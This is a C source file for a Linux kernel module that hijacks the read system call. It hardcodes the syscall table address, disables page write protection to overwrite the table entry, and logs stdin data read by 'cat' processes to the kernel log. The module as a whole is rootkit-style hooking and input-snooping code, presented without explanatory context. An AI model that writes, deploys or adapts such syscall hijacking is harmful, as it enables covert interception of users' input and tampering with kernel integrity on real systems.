#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/errno.h> 
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>  
#include <asm/page.h>  
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");

#define SCT      0xffffffff815223c0

#ifndef STDOUT_FILENO
#define STDOUT_FILENO   1
#endif

#ifndef STDIN_FILENO
#define STDIN_FILENO    0
#endif

static int in_use_ndx = 0;

/* Make the page writable */
int make_rw(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if(pte->pte &~ _PAGE_RW)
        pte->pte |= _PAGE_RW;
    return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte &~ _PAGE_RW;
    return 0;
}

unsigned long *sys_call_table = (unsigned long *)SCT;

asmlinkage long (*ref_read)(unsigned int, char __user *, size_t);

#define STRSZ(a)  ((a)), sizeof((a)) - 1

asmlinkage long new_read(unsigned int fd, char __user *buf, size_t count)
{
    //printk(KERN_ALERT "WRITE HIJACKED");
    long ret;
    char *comm = current->comm;
    pid_t pid  = current->pid;

	in_use_ndx++;
	ret = ref_read(fd, buf, count);

    if (comm && strncmp(comm, STRSZ("cat")) == 0 && fd == STDIN_FILENO && ret >0){
        printk ("(%u: %s): %s\n", pid, comm, buf);
	}

	in_use_ndx--;
    return ret;
}

static int __init start(void)
{
    printk(KERN_ALERT "\nHIJACK INIT\n");

    make_rw((unsigned long)sys_call_table);
    ref_read = (void *)sys_call_table[__NR_read];
    sys_call_table[__NR_read] = new_read;
    make_ro((unsigned long)sys_call_table);

    return 0;
}

static void __exit end(void)
{
	printk("%u not returned from sys_read\n", in_use_ndx);

    make_rw((unsigned long)sys_call_table);
    sys_call_table[__NR_read] = ref_read;  
    make_ro((unsigned long)sys_call_table);

	while (in_use_ndx >0)
		mdelay(200);

	printk("after delay: %u not returned from sys_read\n", in_use_ndx);
    printk(KERN_ALERT "MODULE EXIT\n");
    return;
}

module_init(start);
module_exit(end);
